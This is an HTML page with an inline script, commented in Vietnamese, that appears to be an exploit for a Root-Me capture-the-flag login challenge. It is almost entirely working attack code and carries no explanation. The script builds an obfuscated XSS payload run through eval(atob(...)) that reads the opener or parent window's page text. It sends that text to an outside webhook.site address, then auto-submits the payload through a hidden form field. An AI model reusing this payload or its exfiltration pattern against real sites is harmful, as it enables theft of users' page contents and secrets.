<!DOCTYPE html>
<html>
<head>
    <title>Exploit Opener Secrets</title>

<body>
    <script>
        // --- CẤU HÌNH ---
        const WEBHOOK_URL = 'https://webhook.site/122cd883-0402-47a8-a264-d10c171c01ce';
        const CHALLENGE_URL = 'http://challenge01.root-me.org:58003/login';

        /**
         * PAYLOAD XSS: Viết dưới dạng chuỗi tối giản
         */
        const xssCode = `
            try {
                var target = window.opener || window.parent;
                if (target && target !== window) {
                    var secret = target.document.documentElement.innerText;
                    fetch('${WEBHOOK_URL}?flag=' + btoa(unescape(encodeURIComponent(secret))));
                } else {
                    fetch('${WEBHOOK_URL}?err=no_opener');
                }
            } catch(e) {
                fetch('${WEBHOOK_URL}?err=' + btoa(e.message));
            }
        `.trim();

        // Hàm mã hóa Base64 hỗ trợ Unicode/Ký tự đặc biệt
        function safeBtoa(str) {
            return btoa(unescape(encodeURIComponent(str)));
        }

        const encodedXSS = safeBtoa(xssCode);

        /**
         * THỰC THI: Gửi POST payload
         */
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = CHALLENGE_URL;

        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = 'username';
        
        // Payload eval(atob(...))
        input.value = "<script>eval(atob('" + encodedXSS + "'))<\/script>";

        form.appendChild(input);
        document.body.appendChild(form);

        // Kích hoạt
        form.submit();
    </script>
